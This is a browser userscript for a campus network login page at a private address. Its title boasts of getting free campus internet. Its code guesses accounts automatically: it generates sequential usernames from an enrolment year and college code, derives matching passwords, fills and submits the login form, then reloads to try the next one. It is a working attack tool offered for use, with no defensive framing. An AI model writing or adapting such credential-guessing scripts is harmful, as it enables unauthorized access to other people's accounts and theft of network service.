// ==UserScript==
// @name         白嫖校园网
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://172.20.124.10:8081/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=124.10
// @grant        none
// ==/UserScript==

(function() {
    window.t=function creatCookie(name,value,days){
        var expires ="";
        if(days) {
            var date =new Date();
            date.setTime(date.getTime()+(days*24*3600*1000))
            expires = ";expires="+date.toGMTString();
        };
        document.cookie =name+"="+value+expires+"; path=/";
    };
    window.r=function readCookie(name){
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for(var i=0;i< ca.length;i++){
            var c=ca[i];
            while (c.charAt(0)==' ') c = c.substring(1,c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        };
        return null;}
    window.g=function (){
        var xn=window.r('xn');
        var xy=window.r('xy');
        if(window.r('t')==null){
        window.t('t',0,7);
        }
        else {
            var num=parseInt(window.r('t'));
            num=num+1;
            window.t('t',num,7)
            var num1=String(num).length;
            }
        if(num1==1){
            num="00"+num;
        }
        if(num1==2){
            num="0"+num;
        }
        var account='yd'+xn+xy+num+'0';
        window.t('account',account,7);
        account=window.r('account');
        var password=xy.substring(1,3)+num+'0';
        document.querySelector('#account').value=account;
        document.querySelector('#password').value=password;
        document.querySelector('.btn ').onclick()
        setTimeout("window.location.reload()", 2560 );
    };
    window.s=function(){
        window.t('t',0,7);
        alert('重置成功');
    }
    window.c=function(){
        window.t('xy',document.getElementById("xy").value,7);
    }
    window.save=function(){
        window.t('xn',document.getElementById("xn").value,7);
    }
    var x=document.createElement("div");
    x.innerHTML='<br></br>学年:<input id="xn" type="Number" value="2018" onchange="save()"><br></br><input type="button" onclick="g()" value="Fuck">';
    var str='<br></br>学院号:<input id="xy" type="Number"  value="191" onchange="c()"><br></br><input type="button" onclick="s()" value="重置num">';
    x.innerHTML= x.innerHTML+str;
    var element=document.getElementsByClassName("control-label col-lg-2")[0];
    element.appendChild(x);
    if(window.r('xn')!=2018){
        document.getElementById("xn").value=window.r('xn');
    }
    if(window.r('xy')!=191){
        document.getElementById("xy").value=window.r('xy');
    }
    if(window.r('t')!=0){
        window.g();
    }
})();
